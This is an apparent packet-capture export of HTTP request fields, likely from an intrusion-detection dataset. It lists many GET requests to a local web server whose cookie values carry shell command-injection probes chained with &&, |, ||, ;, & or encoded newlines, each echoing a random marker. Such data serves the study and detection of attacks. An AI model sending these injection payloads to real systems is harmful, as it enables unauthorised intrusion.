http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo MCDVJA$((20+72))$(echo MCDVJA)MCDVJA\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo MCDVJA$((20+72))$(echo MCDVJA)MCDVJA\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo MCDVJA$((20+72))$(echo MCDVJA)MCDVJA\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo MCDVJA$((20+72))$(echo MCDVJA)MCDVJA\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo MCDVJA$((20+72))$(echo MCDVJA)MCDVJA\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo MCDVJA$((20+72))$(echo MCDVJA)MCDVJA\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo MCDVJA$((20+72))$(echo MCDVJA)MCDVJA\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo MMHAGX$((79+83))$(echo MMHAGX)MMHAGX\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo MMHAGX$((79+83))$(echo MMHAGX)MMHAGX\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo MMHAGX$((79+83))$(echo MMHAGX)MMHAGX\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo MMHAGX$((79+83))$(echo MMHAGX)MMHAGX\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo MMHAGX$((79+83))$(echo MMHAGX)MMHAGX\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo MMHAGX$((79+83))$(echo MMHAGX)MMHAGX\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo MMHAGX$((79+83))$(echo MMHAGX)MMHAGX\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo MMHAGX$((79+83))$(echo MMHAGX)MMHAGX\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo TECKBA$((52+4))$(echo TECKBA)TECKBA\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo TECKBA$((52+4))$(echo TECKBA)TECKBA\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo TECKBA$((52+4))$(echo TECKBA)TECKBA\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo TECKBA$((52+4))$(echo TECKBA)TECKBA\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo TECKBA$((52+4))$(echo TECKBA)TECKBA\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo TECKBA$((52+4))$(echo TECKBA)TECKBA\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo TECKBA$((52+4))$(echo TECKBA)TECKBA\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo TECKBA$((52+4))$(echo TECKBA)TECKBA\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo YHFOHA$((24+34))$(echo YHFOHA)YHFOHA\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo YHFOHA$((24+34))$(echo YHFOHA)YHFOHA\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo YHFOHA$((24+34))$(echo YHFOHA)YHFOHA\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo YHFOHA$((24+34))$(echo YHFOHA)YHFOHA\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo YHFOHA$((24+34))$(echo YHFOHA)YHFOHA\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo YHFOHA$((24+34))$(echo YHFOHA)YHFOHA\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo YHFOHA$((24+34))$(echo YHFOHA)YHFOHA\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo YHFOHA$((24+34))$(echo YHFOHA)YHFOHA\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			||echo QICXYB$((22+93))$(echo QICXYB)QICXYB\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			||echo QICXYB$((22+93))$(echo QICXYB)QICXYB\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			||echo QICXYB$((22+93))$(echo QICXYB)QICXYB\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			||echo QICXYB$((22+93))$(echo QICXYB)QICXYB\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			||echo QICXYB$((22+93))$(echo QICXYB)QICXYB\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			||echo QICXYB$((22+93))$(echo QICXYB)QICXYB\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			||echo QICXYB$((22+93))$(echo QICXYB)QICXYB\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			||echo QICXYB$((22+93))$(echo QICXYB)QICXYB\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			||echo FGKXYG$((80+64))$(echo FGKXYG)FGKXYG\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			||echo FGKXYG$((80+64))$(echo FGKXYG)FGKXYG\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			||echo FGKXYG$((80+64))$(echo FGKXYG)FGKXYG\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			||echo FGKXYG$((80+64))$(echo FGKXYG)FGKXYG\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			||echo FGKXYG$((80+64))$(echo FGKXYG)FGKXYG\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			||echo FGKXYG$((80+64))$(echo FGKXYG)FGKXYG\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			||echo FGKXYG$((80+64))$(echo FGKXYG)FGKXYG\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			||echo FGKXYG$((80+64))$(echo FGKXYG)FGKXYG\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			%0aecho GTDKHI$((4+96))$(echo GTDKHI)GTDKHI\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			%0aecho GTDKHI$((4+96))$(echo GTDKHI)GTDKHI\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			%0aecho GTDKHI$((4+96))$(echo GTDKHI)GTDKHI\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			%0aecho GTDKHI$((4+96))$(echo GTDKHI)GTDKHI\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			%0aecho GTDKHI$((4+96))$(echo GTDKHI)GTDKHI\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			%0aecho GTDKHI$((4+96))$(echo GTDKHI)GTDKHI\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			%0aecho GTDKHI$((4+96))$(echo GTDKHI)GTDKHI\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			%0aecho GTDKHI$((4+96))$(echo GTDKHI)GTDKHI\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			%0d%0aecho YCJTZC$((41+44))$(echo YCJTZC)YCJTZC\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			%0d%0aecho YCJTZC$((41+44))$(echo YCJTZC)YCJTZC\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			%0d%0aecho YCJTZC$((41+44))$(echo YCJTZC)YCJTZC\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			%0d%0aecho YCJTZC$((41+44))$(echo YCJTZC)YCJTZC\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			%0d%0aecho YCJTZC$((41+44))$(echo YCJTZC)YCJTZC\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			%0d%0aecho YCJTZC$((41+44))$(echo YCJTZC)YCJTZC\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			%0d%0aecho YCJTZC$((41+44))$(echo YCJTZC)YCJTZC\\				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			%0d%0aecho YCJTZC$((41+44))$(echo YCJTZC)YCJTZC\\				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			echo HAWRCG$((20+19))$(echo HAWRCG)HAWRCG&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			echo HAWRCG$((20+19))$(echo HAWRCG)HAWRCG&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			echo HAWRCG$((20+19))$(echo HAWRCG)HAWRCG&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			echo HAWRCG$((20+19))$(echo HAWRCG)HAWRCG&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			echo HAWRCG$((20+19))$(echo HAWRCG)HAWRCG&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			echo HAWRCG$((20+19))$(echo HAWRCG)HAWRCG&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			echo HAWRCG$((20+19))$(echo HAWRCG)HAWRCG&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			echo HAWRCG$((20+19))$(echo HAWRCG)HAWRCG&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			;echo SOJMWQ$((6+16))$(echo SOJMWQ)SOJMWQ&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			;echo SOJMWQ$((6+16))$(echo SOJMWQ)SOJMWQ&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			;echo SOJMWQ$((6+16))$(echo SOJMWQ)SOJMWQ&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			;echo SOJMWQ$((6+16))$(echo SOJMWQ)SOJMWQ&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			;echo SOJMWQ$((6+16))$(echo SOJMWQ)SOJMWQ&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			;echo SOJMWQ$((6+16))$(echo SOJMWQ)SOJMWQ&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			;echo SOJMWQ$((6+16))$(echo SOJMWQ)SOJMWQ&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			;echo SOJMWQ$((6+16))$(echo SOJMWQ)SOJMWQ&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			;echo WXALON$((70+46))$(echo WXALON)WXALON&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			;echo WXALON$((70+46))$(echo WXALON)WXALON&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			;echo WXALON$((70+46))$(echo WXALON)WXALON&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			;echo WXALON$((70+46))$(echo WXALON)WXALON&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			;echo WXALON$((70+46))$(echo WXALON)WXALON&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			;echo WXALON$((70+46))$(echo WXALON)WXALON&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			;echo WXALON$((70+46))$(echo WXALON)WXALON&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			;echo WXALON$((70+46))$(echo WXALON)WXALON&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&echo ZFNRAW$((43+50))$(echo ZFNRAW)ZFNRAW&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&echo ZFNRAW$((43+50))$(echo ZFNRAW)ZFNRAW&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&echo ZFNRAW$((43+50))$(echo ZFNRAW)ZFNRAW&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&echo ZFNRAW$((43+50))$(echo ZFNRAW)ZFNRAW&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&echo ZFNRAW$((43+50))$(echo ZFNRAW)ZFNRAW&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&echo ZFNRAW$((43+50))$(echo ZFNRAW)ZFNRAW&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&echo ZFNRAW$((43+50))$(echo ZFNRAW)ZFNRAW&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&echo ZFNRAW$((43+50))$(echo ZFNRAW)ZFNRAW&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&echo JRFSCA$((80+17))$(echo JRFSCA)JRFSCA&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&echo JRFSCA$((80+17))$(echo JRFSCA)JRFSCA&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&echo JRFSCA$((80+17))$(echo JRFSCA)JRFSCA&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&echo JRFSCA$((80+17))$(echo JRFSCA)JRFSCA&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&echo JRFSCA$((80+17))$(echo JRFSCA)JRFSCA&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&echo JRFSCA$((80+17))$(echo JRFSCA)JRFSCA&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&echo JRFSCA$((80+17))$(echo JRFSCA)JRFSCA&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&echo JRFSCA$((80+17))$(echo JRFSCA)JRFSCA&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			echo RMVPTS$((91+62))$(echo RMVPTS)RMVPTS&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			echo RMVPTS$((91+62))$(echo RMVPTS)RMVPTS&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			echo RMVPTS$((91+62))$(echo RMVPTS)RMVPTS&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			echo RMVPTS$((91+62))$(echo RMVPTS)RMVPTS&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo EJHBDG$((86+39))$(echo EJHBDG)EJHBDG&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo EJHBDG$((86+39))$(echo EJHBDG)EJHBDG&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo EJHBDG$((86+39))$(echo EJHBDG)EJHBDG&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo EJHBDG$((86+39))$(echo EJHBDG)EJHBDG&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo EJHBDG$((86+39))$(echo EJHBDG)EJHBDG&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo EJHBDG$((86+39))$(echo EJHBDG)EJHBDG&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo EJHBDG$((86+39))$(echo EJHBDG)EJHBDG&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo EJHBDG$((86+39))$(echo EJHBDG)EJHBDG&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo CHYPKI$((85+57))$(echo CHYPKI)CHYPKI&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo CHYPKI$((85+57))$(echo CHYPKI)CHYPKI&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo CHYPKI$((85+57))$(echo CHYPKI)CHYPKI&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo CHYPKI$((85+57))$(echo CHYPKI)CHYPKI&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo CHYPKI$((85+57))$(echo CHYPKI)CHYPKI&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo CHYPKI$((85+57))$(echo CHYPKI)CHYPKI&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo CHYPKI$((85+57))$(echo CHYPKI)CHYPKI&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo CHYPKI$((85+57))$(echo CHYPKI)CHYPKI&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo NJAWOZ$((2+23))$(echo NJAWOZ)NJAWOZ&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo NJAWOZ$((2+23))$(echo NJAWOZ)NJAWOZ&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo NJAWOZ$((2+23))$(echo NJAWOZ)NJAWOZ&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo NJAWOZ$((2+23))$(echo NJAWOZ)NJAWOZ&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo NJAWOZ$((2+23))$(echo NJAWOZ)NJAWOZ&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo NJAWOZ$((2+23))$(echo NJAWOZ)NJAWOZ&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo NJAWOZ$((2+23))$(echo NJAWOZ)NJAWOZ&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo NJAWOZ$((2+23))$(echo NJAWOZ)NJAWOZ&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo YKLWWZ$((22+40))$(echo YKLWWZ)YKLWWZ&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo YKLWWZ$((22+40))$(echo YKLWWZ)YKLWWZ&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo YKLWWZ$((22+40))$(echo YKLWWZ)YKLWWZ&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo YKLWWZ$((22+40))$(echo YKLWWZ)YKLWWZ&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo YKLWWZ$((22+40))$(echo YKLWWZ)YKLWWZ&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo YKLWWZ$((22+40))$(echo YKLWWZ)YKLWWZ&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo YKLWWZ$((22+40))$(echo YKLWWZ)YKLWWZ&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo YKLWWZ$((22+40))$(echo YKLWWZ)YKLWWZ&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			||echo LPTYVN$((22+48))$(echo LPTYVN)LPTYVN&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			||echo LPTYVN$((22+48))$(echo LPTYVN)LPTYVN&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			||echo LPTYVN$((22+48))$(echo LPTYVN)LPTYVN&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			||echo LPTYVN$((22+48))$(echo LPTYVN)LPTYVN&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			||echo LPTYVN$((22+48))$(echo LPTYVN)LPTYVN&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			||echo LPTYVN$((22+48))$(echo LPTYVN)LPTYVN&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			||echo LPTYVN$((22+48))$(echo LPTYVN)LPTYVN&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			||echo LPTYVN$((22+48))$(echo LPTYVN)LPTYVN&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			||echo TQRUBY$((58+1))$(echo TQRUBY)TQRUBY&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			||echo TQRUBY$((58+1))$(echo TQRUBY)TQRUBY&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			||echo TQRUBY$((58+1))$(echo TQRUBY)TQRUBY&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			||echo TQRUBY$((58+1))$(echo TQRUBY)TQRUBY&'				/web/
